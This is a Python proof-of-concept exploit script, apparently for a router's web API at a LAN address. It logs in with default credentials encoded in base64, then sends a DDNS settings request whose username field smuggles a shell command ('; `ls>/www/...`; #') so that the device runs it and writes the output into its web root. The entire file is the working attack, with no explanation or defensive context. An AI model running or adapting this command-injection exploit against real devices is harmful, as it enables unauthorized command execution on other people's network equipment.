import requests
import json

url1 = 'http://192.168.31.6/cgi-bin/login.cgi'
data1 = {"username":"YWRtaW4%3D","password":"MTIzNDU2","token":"","source":"web","cn":"","action":"auth"}

response1 = requests.post(url1, data=json.dumps(data1))
print(response1.text)

url2 = 'http://192.168.31.6/API/obj'
headers = {
    'Host': '192.168.31.6',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Content-Type': 'application/json',
    'Origin': 'http://192.168.31.6',
    'Referer': 'http://192.168.31.6/idp/idp_ping.html',
    'Cookie': response1.headers['Set-Cookie'].split(" ")[0],
}
data2 = {"ddns":{"DdnsP":{"enable":"1","username":"; `ls>/www/20250328.txt`; #","password":"admin","hostname":"admin","provider":"DynDNS.org","system":"0","mailex":"rweed","backupmailex":"1","wildcard":"1","ip":"","status":""}}}

response2 = requests.post(url2, headers=headers, data=json.dumps(data2))
print(response2.text)

url3 = 'http://192.168.31.6/API/info'
data3 = {
     'ddnsStatus': {
    }
}

response3 = requests.post(url3, headers=headers, data=json.dumps(data3))
print(response3.text)
